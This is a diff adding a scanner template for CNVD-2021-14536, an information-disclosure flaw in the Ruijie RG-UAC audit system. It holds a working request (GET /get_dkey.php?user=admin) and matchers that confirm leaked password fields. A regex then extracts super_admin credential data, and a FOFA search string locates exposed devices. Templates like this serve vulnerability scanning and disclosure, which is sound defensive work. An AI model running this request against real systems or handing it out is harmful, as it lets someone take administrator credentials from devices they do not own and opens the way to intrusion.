@@ -1,0 +1,29 @@
+## id: CNVD-2021-14536
+## name: Ruijie RG-UAC Unified Internet Behavior Management Audit System - Information Disclosure
+## author: hack007x
+## severity: high
+## tags: cnvd2021,cnvd,ruijie,disclosure,vuln
+## description: Ruijie RG-UAC Unified Internet Behavior Management Audit System is susceptible to information disclosure. Attackers could obtain user accounts and passwords by reviewing the source code of web pages, resulting in the leakage of administrator user authentication information.
+## affects: rg-uac
+## cvss-score: 8.3
+## reference: https://www.adminxe.com/2163.html
+## fofa-query: title="RG-UAC登录页面"
+## verification: true
+
+GET /get_dkey.php?user=admin HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains '"pre_define"'
+#@ matcher: body contains '"auth_method"'
+#@ matcher: body contains '"name"'
+#@ matcher: body contains '"password"'
+#@ matcher: status_code == 200
+#> extract: name=ex_regex, from=body, regex=/"role":"super_admin",(["a-z:,0-9]+),"lastpwdtime":/, group=1
+
+
+
+
+
+# @VEIL-STAMP: 54d317a2193919c07e4b9c9add7e0ddfda1141136374c362251076c4ce457fbf
